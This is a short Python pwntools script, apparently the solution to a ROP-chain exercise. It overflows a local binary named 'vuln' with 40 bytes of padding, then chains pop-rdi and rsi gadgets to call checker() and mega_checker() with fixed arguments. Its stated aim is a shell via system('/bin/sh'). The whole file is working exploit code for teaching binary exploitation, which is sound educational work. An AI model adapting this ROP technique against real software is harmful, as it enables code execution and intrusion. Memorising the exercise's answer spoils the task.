#!/usr/bin/env python

"""
Solution (exploit) for rop-chain task.

Use pwntools (https://docs.pwntools.com/en/latest/) to overwrite the return
address of main() and call system("/bin/sh").
"""

from pwn import *

io = process("vuln")
elf = ELF("./vuln")


# TODO: Fill required addresses.
offset = 40

# Gadgets
pop_rdi_ret_address = p64(0x0000000000400743) # ROPgadget --binary vuln | grep rdi
rsi_gadget = p64(0x0000000000400741) # ROPgadget --binary vuln | grep rsi

# Params for functions
value1 = p64(0x11223344) # param for checker
value2_1 = p64(0x88776655) # first param for mega_checker
value2_2 = p64(0xaabbccdd) # second param for mega_checker

# Functions addresses
checker_address = p64(elf.symbols["checker"]) # address of checker
mega_checker_address = p64(elf.symbols["mega_checker"]) # address of mega_checker

# TODO: Discover and fill address of gadget to initialize rsi.
# TODO: Update payload to call mega_checker() after calling checker().
payload = 40 * b'A' + pop_rdi_ret_address + value1 + checker_address + pop_rdi_ret_address + value2_1 + rsi_gadget + value2_2 + p64(0x0) +  mega_checker_address

open("payload", "wb").write(payload)


msg = io.recvuntil(': ')
io.sendline(payload)
io.interactive()
